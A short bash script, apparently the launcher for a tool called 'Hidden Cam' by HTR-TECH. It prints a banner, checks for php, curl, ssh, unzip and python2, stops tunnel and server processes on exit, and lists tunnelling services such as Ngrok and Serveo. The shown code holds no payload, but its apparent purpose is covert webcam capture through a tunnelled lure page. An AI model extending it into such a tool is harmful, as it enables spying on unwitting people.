#!/bin/bash

trap 'printf "\n";stop' 2
stop() {

checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
killall -2 ssh > /dev/null 2>&1
fi
exit 1

}
req() {

command -v php > /dev/null 2>&1 || { echo >&2 "PHP is not installed ! Install it."; exit 1; }
command -v curl > /dev/null 2>&1 || { echo >&2 "Curl is not installed ! Install it."; exit 1; }
command -v ssh > /dev/null 2>&1 || { echo >&2 "Openssh is not installed ! Install it"; exit 1; }
command -v unzip > /dev/null 2>&1 || { echo >&2 "Unzip is not installed ! Install it"; exit 1; }
command -v python2 > /dev/null 2>&1 || { echo >&2 "Python2 is not installed ! Install it"; exit 1; }

}
banner() {

clear
printf "\e[1;33m  _    _ _     _     _             \e[1;32m  _____                 \e[0m\n"
printf "\e[1;33m | |  | (_)   | |   | |            \e[1;32m / ____|                \e[0m\n"
printf "\e[1;33m | |__| |_  __| | __| | ___ _ __   \e[1;32m| |     __ _ _ __ ___   \e[0m\n"
printf "\e[1;33m |  __  | |/ _  |/ _  |/ _ \  _ \  \e[1;32m| |    / _  |  _   _ \  \e[0m\n"
printf "\e[1;33m | |  | | | (_| | (_| |  __/ | | | \e[1;32m| |___| (_| | | | | | | \e[0m\n"
printf "\e[1;33m |_|  |_|_|\__,_|\__,_|\___|_| |_| \e[1;32m \_____\__,_|_| |_| |_| \e[0m\n"
printf " \n"
printf "\e[0m\e[1;93m    Created By HTR-TECH \e[0m\e[1;91m(\e[0m\e[1;92mTahmid Rayat\e[0m\e[1;91m)\e[0m\n"
printf " \n"

}
menu() {

printf " \e[0m\e[1;91m[\e[0m\e[1;97m01\e[0m\e[1;91m]\e[0m\e[1;93m Ngrok\e[0m\n"
printf " \e[0m\e[1;91m[\e[0m\e[1;97m02\e[0m\e[1;91m]\e[0m\e[1;93m Serveo\e[0m\n"
printf " \e[0m\e[1;91m[\e[0m\e[1;97m03\e[0m\e[1;91m]\e[0m\e[1;93m LocalHost.Run\e[0m\n"
printf " \e[0m\e[1;91m[\e[0m\e[1;97m04\e[0m\e[1;91m]\e[0m\e[1;93m PageKite\e[0m\n"

}

banner
req
menu
